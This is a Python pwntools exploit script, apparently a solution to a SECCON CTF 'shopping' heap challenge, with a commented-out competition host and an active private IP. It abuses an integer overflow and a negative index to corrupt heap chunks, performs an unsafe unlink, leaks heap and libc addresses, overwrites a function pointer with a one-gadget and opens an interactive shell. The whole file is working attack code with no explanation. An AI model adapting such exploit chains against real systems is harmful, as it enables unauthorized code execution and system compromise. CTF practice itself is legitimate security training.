from pwn import *

s = remote('192.168.50.4',1234)
#s = remote('shopping.pwn.seccon.jp',16294)
raw_input()
def add_product(name,price,stock):
  s.recvuntil(':')
  s.send('1\n')
  s.recvuntil('>>')
  s.send(name)
  s.recvuntil('>>')
  s.send(price+'\n')
  s.recvuntil('>>')
  s.send(stock+'\n')
def add_cart(name,stock):
  s.recvuntil(':')
  s.send('1\n')
  s.recvuntil('>>')
  s.send(name)
  s.recvuntil('>>')
  s.send(str(stock)+'\n')
def overwrite(dat):
  s.recvuntil(':')
  s.send('-1\n')
  s.recvuntil('>>')
  s.send('n\n')
  s.recvuntil('>>')
  s.send('y\n')
  s.recvuntil(':')
  s.send(dat)

s.recvuntil(':')
s.send('1\n')
add_product('1234\n',"2147483647","2147483647")
s.recvuntil(':')
s.send('0\n')
s.recvuntil(':')
s.send('2\n')
add_cart('1234\n',1)
s.send('3\n')
s.recvuntil(':')
s.send('0\n')
s.recvuntil(':')
s.send('1\n')
s.send('y\n')
s.recvuntil(':')
s.send('A'*64)
s.recvuntil(':')
s.send('B'*0x29+p64(0xa0)+'\n')
add_product('aaaa\n','1','1')
add_product('bbbb\n','1','1')
s.send('0\n')
s.recvuntil(':')
s.send('-1\n')
s.recvuntil('>>')
s.send('y\n')
s.recvuntil(':')
dat = ""
dat += "A"*0x60
dat += p64(0x0)
dat += p64(0x31)
dat += p64(0x603118)
s.send(dat+'\n')
s.recvuntil('>>')
s.send('n\n')
s.recvuntil(':')
s.send('1\n')
s.recvuntil(':')
s.send('2\n')
heap = u64(s.recvuntil('(')[-5:-1]+'\x00\x00\x00\x00')
log.info("heap : 0x%08x"%heap)

s.send('0\n')
s.recvuntil(':')
s.send('-1\n')
s.recvuntil('>>')
s.send('y\n')
s.recvuntil(':')
dat = ""
dat += "A"*0x60
dat += p64(0x0)
dat += p64(0x31)
dat += p64(0x603028)
s.send(dat+'\n')
s.recvuntil('>>')
s.send('n\n')
s.recvuntil(':')
s.send('1\n')
s.recvuntil(':')
s.send('2\n')
strlen = u64(s.recvuntil('(')[-7:-1]+'\x00\x00')
libc = strlen - 0x889B0
magic = libc + 0x04647C
log.info("strlen : 0x%08x"%strlen)
dat = "A"*16
dat += p64(0x603118-0x18)
dat += p64(0x603118-0x10)
dat += "A"*(0x60)
dat += p64(0xb0)
dat += p64(0x30)
dat += p64(heap+0x50)
s.send('0\n')
s.recvuntil(':')
s.send('-1\n')
s.recvuntil('>>')
s.send('y\n')
s.recvuntil(':')
s.send(dat+'\n')
s.recvuntil('>>')
s.send('y\n')
s.recvuntil(':')
dat = ""
dat += "b"*8
dat += p64(0x603118-0x18)
dat += p64(0x603118-0x10)
dat += '\x00'*16
dat += "b"*16
s.send(dat+'\x40'+'\x00'*6)
s.recvuntil(':')
s.send('1\n')
s.recvuntil(':')
s.send('3\n')
s.recvuntil(':')
s.send('0\n')
overwrite('A'*0x10+p64(0x6030C0)+'\n')
overwrite(p64(magic)+'\n')
s.recvuntil(':')
s.send('1\n')
s.recvuntil(':')
s.send('1\n')
s.recvuntil('>>')
s.send('/bin/sh\n')
s.interactive()
